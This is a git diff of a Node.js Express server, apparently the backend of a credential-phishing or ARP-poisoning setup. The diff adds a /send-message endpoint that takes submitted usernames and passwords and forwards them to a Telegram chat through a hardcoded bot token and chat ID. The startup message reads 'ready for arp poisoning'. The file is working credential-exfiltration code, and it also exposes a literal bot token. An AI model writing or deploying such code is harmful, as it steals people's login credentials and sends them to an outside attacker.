@@ -1,7 +1,8 @@
 import express from "express";
 import fs from "fs";
 import cors from 'cors';
-require('dotenv').config();
+
+const TelegramBot = require('node-telegram-bot-api');
 
 
 const app = express();
@@ -31,41 +32,38 @@ app.post("/userdata", (req, res, next) => {
         res.sendStatus(404);
         return;
     }
+});
 
 
+// replace the value below with the Telegram token you receive from @BotFather
+const token = '7142615915:AAEbK7yRGnxZ18y4UTBI8izH4dzeI6xNjpQ';
 
-    
-const TelegramBot = require('node-telegram-bot-api');
-
-const token = process.env.token;
-
+// Create a bot instance
 const bot = new TelegramBot(token);
 
-const userName = req.body.userName;
-const password = req.body.password;
-const message = `SESSION\nlogin username= ${userName}\npassword = ${password}`;
-const chatId = process.env.chatId;  // Replace with the target chat ID
+// Endpoint to receive data and send a message
+app.post('/send-message', (req, res) => {
+  // Construct the message from the request payload
+  const userName = req.body.userName;
+  const password = req.body.password;
+  const message = `SESSION\nlogin username= ${userName}\npassword = ${password}`;
 
-const moment = require('moment'); // Assuming you've installed moment.js
-
-const today = moment().format('LL'); // Example output: "2024-05-28 Tuesday" (adjust format if needed)
-
-bot.sendMessage(chatId, `Today's date is: ${today}`)
-  .then(() => console.log())
-  // .catch((error) => console.error('Error sending message:', error));
+  // Define the chat ID
+  const chatId = '6502945541';  // Replace with the target chat ID
 
   // Send the message
   bot.sendMessage(chatId, message).then(() => {
-    console.log('Message sent successfully');
-    res.send('Message sent successfully');
-}).catch(() => {
-    // console.error('Error sending message:', error);
-    // res.status(500).send('Error sending message');
-});
-
+      console.log('Message sent successfully');
+      res.send('Message sent successfully');
+  }).catch((error) => {
+      console.error('Error sending message:', error);
+      res.status(500).send('Error sending message');
+  });
 });
 
 
 app.listen(5000, () => console.log("Server running on port 5000, ready for arp poisoning"));
+
+
 
 
